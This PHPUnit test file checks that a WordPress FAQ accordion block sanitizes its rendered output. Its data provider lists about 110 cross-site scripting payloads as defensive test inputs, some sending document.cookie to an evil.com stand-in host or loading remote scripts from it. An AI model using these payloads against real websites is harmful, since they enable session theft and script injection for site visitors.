<?php
/**
 * Property-based test for FAQ Accordion block render output sanitization.
 *
 * Feature: faq-accordion-block, Property 7: Render Output Is Sanitized
 * Validates: Requirements 7.3
 *
 * For any FAQ item containing HTML markup (including potentially dangerous tags
 * like <script>, <iframe>, <object>, <embed>, onclick attributes, javascript: URLs),
 * the render callback output should contain the sanitized version of the content
 * (as produced by wp_kses_post) and never include raw unsanitized input.
 */

declare(strict_types=1);

namespace WPBits\AiFaqGenerator\Tests\Unit;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;

use function WPBits\AiFaqGenerator\Blocks\FaqAccordion\render_faq_accordion_block;

class RenderSanitizationPropertyTest extends TestCase
{
    /**
     * **Validates: Requirements 7.3**
     *
     * Property 7: Render Output Is Sanitized.
     * For any FAQ item containing HTML markup including dangerous tags,
     * verify output contains sanitized content via wp_kses_post and never
     * raw unsanitized input.
     */
    #[Test]
    #[DataProvider('dangerousHtmlFaqItemsProvider')]
    public function render_output_never_contains_dangerous_html(
        string $question,
        string $answer,
        array $forbiddenPatterns,
        string $description
    ): void {
        $output = render_faq_accordion_block([
            'items' => [
                ['question' => $question, 'answer' => $answer],
            ],
        ]);

        foreach ($forbiddenPatterns as $pattern) {
            $this->assertDoesNotMatchRegularExpression(
                $pattern,
                $output,
                "Output should not contain dangerous HTML ({$description}). Pattern: {$pattern}"
            );
        }
    }

    /**
     * **Validates: Requirements 7.3**
     *
     * Property 7: Safe HTML is preserved in render output.
     * For any FAQ item containing safe HTML tags (strong, em, a, p, etc.),
     * the render callback should preserve them in the output.
     */
    #[Test]
    #[DataProvider('safeHtmlPreservedProvider')]
    public function render_output_preserves_safe_html(
        string $question,
        string $answer,
        string $expectedSubstring,
        string $description
    ): void {
        $output = render_faq_accordion_block([
            'items' => [
                ['question' => $question, 'answer' => $answer],
            ],
        ]);

        $this->assertStringContainsString(
            $expectedSubstring,
            $output,
            "Output should preserve safe HTML ({$description})."
        );
    }

    /**
     * Data provider generating 110+ FAQ items with dangerous HTML markup.
     *
     * @return array<string, array{string, string, array<string>, string}>
     */
    public static function dangerousHtmlFaqItemsProvider(): array
    {
        $cases = [];

        mt_srand(77777);

        // ─── Script tag variations (20 cases) ────────────────────────────────
        $scriptVariations = [
            '<script>alert("xss")</script>',
            '<script type="text/javascript">document.cookie</script>',
            '<SCRIPT>alert(1)</SCRIPT>',
            '<script src="https://evil.com/xss.js"></script>',
            '<script>window.location="https://evil.com"</script>',
            '<script defer>fetch("https://evil.com")</script>',
            '<script async src="evil.js"></script>',
            '<script>new Image().src="https://evil.com/?c="+document.cookie</script>',
            '<script>eval("alert(1)")</script>',
            '<script type="module">import("https://evil.com/m.js")</script>',
            '<ScRiPt>alert("mixed case")</ScRiPt>',
            '<script >alert("space before close")</script >',
            "<script\n>alert('newline')</script>",
            '<script>document.write("<img src=x>")</script>',
            '<script>setTimeout(function(){alert(1)},0)</script>',
            '<script>Object.defineProperty(window,"x",{get:alert})</script>',
            '<script>void(0)</script>',
            '<script>console.log(document.domain)</script>',
            '<script>top.location="https://evil.com"</script>',
            '<script>history.pushState(null,null,"https://evil.com")</script>',
        ];

        foreach ($scriptVariations as $i => $script) {
            $safeQuestion = 'Question about security ' . ($i + 1);
            $cases["script_in_answer_{$i}"] = [
                $safeQuestion,
                "The answer is: {$script} and more text.",
                ['/<script\b/i'],
                "script tag variation {$i} in answer",
            ];
        }

        // Script in question field (5 cases).
        for ($i = 0; $i < 5; $i++) {
            $script = $scriptVariations[$i];
            $cases["script_in_question_{$i}"] = [
                "Is this safe? {$script}",
                'Yes, this is a safe answer.',
                ['/<script\b/i'],
                "script tag in question {$i}",
            ];
        }

        // ─── Iframe tag variations (15 cases) ────────────────────────────────
        $iframeVariations = [
            '<iframe src="https://evil.com"></iframe>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<IFRAME SRC="https://evil.com"></IFRAME>',
            '<iframe width="0" height="0" src="https://evil.com"></iframe>',
            '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
            '<iframe sandbox src="https://evil.com"></iframe>',
            '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
            '<iframe name="hidden" src="https://evil.com" style="display:none"></iframe>',
            '<iframe src="https://evil.com" onload="alert(1)"></iframe>',
            '<iframe src="//evil.com"></iframe>',
            '<iframe/src="https://evil.com"></iframe>',
            '<iframe src="https://evil.com" allowfullscreen></iframe>',
            '<iframe src="https://evil.com" allow="camera;microphone"></iframe>',
            '<iframe loading="lazy" src="https://evil.com"></iframe>',
            '<iframe src="https://evil.com" referrerpolicy="no-referrer"></iframe>',
        ];

        foreach ($iframeVariations as $i => $iframe) {
            $cases["iframe_in_answer_{$i}"] = [
                'What is an iframe?',
                "Here is content: {$iframe} end.",
                ['/<iframe\b/i'],
                "iframe variation {$i}",
            ];
        }

        // ─── Object/Embed tag variations (15 cases) ──────────────────────────
        $objectEmbedVariations = [
            ['<object data="https://evil.com/flash.swf"></object>', '/<object\b/i'],
            ['<object type="application/x-shockwave-flash" data="evil.swf"></object>', '/<object\b/i'],
            ['<OBJECT DATA="evil.swf"></OBJECT>', '/<object\b/i'],
            ['<object classid="clsid:D27CDB6E" codebase="evil.cab"></object>', '/<object\b/i'],
            ['<object data="data:text/html,<script>alert(1)</script>"></object>', '/<object\b/i'],
            ['<embed src="https://evil.com/flash.swf">', '/<embed\b/i'],
            ['<embed type="application/x-shockwave-flash" src="evil.swf">', '/<embed\b/i'],
            ['<EMBED SRC="evil.swf">', '/<embed\b/i'],
            ['<embed src="javascript:alert(1)">', '/<embed\b/i'],
            ['<embed src="data:text/html,<script>alert(1)</script>">', '/<embed\b/i'],
            ['<object><embed src="evil.swf"></embed></object>', '/<(object|embed)\b/i'],
            ['<object data="evil.pdf" type="application/pdf"></object>', '/<object\b/i'],
            ['<embed src="evil.svg" type="image/svg+xml">', '/<embed\b/i'],
            ['<object type="text/html" data="https://evil.com"></object>', '/<object\b/i'],
            ['<embed hidden src="https://evil.com">', '/<embed\b/i'],
        ];

        foreach ($objectEmbedVariations as $i => [$tag, $pattern]) {
            $cases["object_embed_{$i}"] = [
                'What are embedded objects?',
                "Content: {$tag} more text.",
                [$pattern],
                "object/embed variation {$i}",
            ];
        }

        // ─── Event handler attribute variations (20 cases) ───────────────────
        $eventHandlerVariations = [
            '<div onclick="alert(1)">click me</div>',
            '<img src="x" onerror="alert(1)">',
            '<body onload="alert(1)">',
            '<div onmouseover="alert(1)">hover</div>',
            '<input onfocus="alert(1)" autofocus>',
            '<marquee onstart="alert(1)">',
            '<video onloadstart="alert(1)"><source></video>',
            '<details ontoggle="alert(1)">',
            '<div onmouseenter="alert(1)">enter</div>',
            '<a onmousedown="alert(1)">link</a>',
            '<p oncontextmenu="alert(1)">right click</p>',
            '<div ondblclick="alert(1)">double click</div>',
            '<form onsubmit="alert(1)"><input></form>',
            '<select onchange="alert(1)"><option>x</option></select>',
            '<textarea oninput="alert(1)">text</textarea>',
            '<div onkeydown="alert(1)">key</div>',
            '<div onkeyup="alert(1)">key up</div>',
            '<div onkeypress="alert(1)">key press</div>',
            '<img src="valid.jpg" ONERROR="alert(1)">',
            '<div ONCLICK="alert(1)">UPPER</div>',
        ];

        foreach ($eventHandlerVariations as $i => $html) {
            $cases["event_handler_{$i}"] = [
                'How do event handlers work?',
                "Example: {$html} end.",
                ['/\bon\w+\s*=/i'],
                "event handler variation {$i}",
            ];
        }

        // ─── JavaScript URL variations (15 cases) ────────────────────────────
        $jsUrlVariations = [
            '<a href="javascript:alert(1)">click</a>',
            '<a href="javascript:void(0)">link</a>',
            '<a href="JAVASCRIPT:alert(1)">upper</a>',
            '<a href="javascript:document.cookie">steal</a>',
            '<a href=" javascript:alert(1)">space prefix</a>',
            '<a href="javascript:fetch(\'https://evil.com\')">fetch</a>',
            '<a href="javascript:window.open(\'evil.com\')">open</a>',
            '<a href="javascript:eval(atob(\'YWxlcnQoMSk=\'))">encoded</a>',
            '<a href="javascript:location=\'evil.com\'">redirect</a>',
            '<a href="javascript:import(\'evil.js\')">import</a>',
            '<a href="javascript:top.location=\'evil.com\'">top</a>',
            '<a href="javascript:parent.location=\'evil.com\'">parent</a>',
            '<a href="javascript:self.location=\'evil.com\'">self</a>',
            '<a href="javascript:frames[0].location=\'evil.com\'">frame</a>',
            '<a href="javascript:history.back()">back</a>',
        ];

        foreach ($jsUrlVariations as $i => $html) {
            $cases["js_url_{$i}"] = [
                'What are javascript URLs?',
                "Example: {$html} end.",
                ['/href\s*=\s*["\']?\s*javascript:/i'],
                "javascript URL variation {$i}",
            ];
        }

        // ─── Combined/mixed dangerous content (10 cases) ─────────────────────
        $combinedCases = [
            '<script>alert(1)</script><iframe src="evil.com"></iframe>',
            '<div onclick="alert(1)"><script>x</script></div>',
            '<a href="javascript:alert(1)" onclick="alert(2)">link</a>',
            '<object data="evil.swf"><embed src="evil.swf"></object>',
            '<img src="x" onerror="alert(1)"><script>alert(2)</script>',
            '<iframe src="javascript:alert(1)" onload="alert(2)"></iframe>',
            '<embed src="evil.swf" onload="alert(1)">',
            '<script>alert(1)</script><div onclick="alert(2)">text</div>',
            '<object data="javascript:alert(1)"><script>x</script></object>',
            '<style>body{background:url("javascript:alert(1)")}</style><script>x</script>',
        ];

        foreach ($combinedCases as $i => $html) {
            $cases["combined_{$i}"] = [
                'Mixed dangerous content ' . ($i + 1),
                "Content: {$html} end.",
                ['/<script\b/i', '/<iframe\b/i', '/<object\b/i', '/<embed\b/i', '/\bon\w+\s*=/i'],
                "combined dangerous content {$i}",
            ];
        }

        // ─── Randomly generated mixed content (10 cases) ─────────────────────
        $dangerousTags = ['<script>x</script>', '<iframe src="e"></iframe>', '<object data="e"></object>', '<embed src="e">'];
        $safeText = ['Hello world', 'FAQ answer here', 'Some content', 'More text', 'Information'];

        for ($i = 0; $i < 10; $i++) {
            $tag = $dangerousTags[mt_rand(0, count($dangerousTags) - 1)];
            $text = $safeText[mt_rand(0, count($safeText) - 1)];
            $cases["random_mixed_{$i}"] = [
                "Random question {$i}",
                "{$text} {$tag} {$text}",
                ['/<script\b/i', '/<iframe\b/i', '/<object\b/i', '/<embed\b/i'],
                "random mixed content {$i}",
            ];
        }

        return $cases;
    }

    /**
     * Data provider verifying safe HTML is preserved in output.
     *
     * @return array<string, array{string, string, string, string}>
     */
    public static function safeHtmlPreservedProvider(): array
    {
        $cases = [];

        $safeHtmlExamples = [
            ['<strong>bold text</strong>', '<strong>bold text</strong>', 'strong tag'],
            ['<em>italic text</em>', '<em>italic text</em>', 'em tag'],
            ['<a href="https://example.com">link</a>', '<a href="https://example.com">link</a>', 'anchor tag'],
            ['<p>paragraph</p>', '<p>paragraph</p>', 'p tag'],
            ['<br>', '<br>', 'br tag'],
            ['<ul><li>item</li></ul>', '<ul><li>item</li></ul>', 'ul/li tags'],
            ['<ol><li>item</li></ol>', '<ol><li>item</li></ol>', 'ol/li tags'],
            ['<blockquote>quote</blockquote>', '<blockquote>quote</blockquote>', 'blockquote tag'],
            ['<code>code</code>', '<code>code</code>', 'code tag'],
            ['<h3>heading</h3>', '<h3>heading</h3>', 'h3 tag'],
        ];

        foreach ($safeHtmlExamples as $i => [$html, $expected, $desc]) {
            $cases["safe_html_in_answer_{$i}"] = [
                "Question about {$desc}",
                "The answer contains {$html} in it.",
                $expected,
                "{$desc} preserved in answer",
            ];
        }

        foreach ($safeHtmlExamples as $i => [$html, $expected, $desc]) {
            $cases["safe_html_in_question_{$i}"] = [
                "Question with {$html}",
                'A plain text answer.',
                $expected,
                "{$desc} preserved in question",
            ];
        }

        return $cases;
    }
}
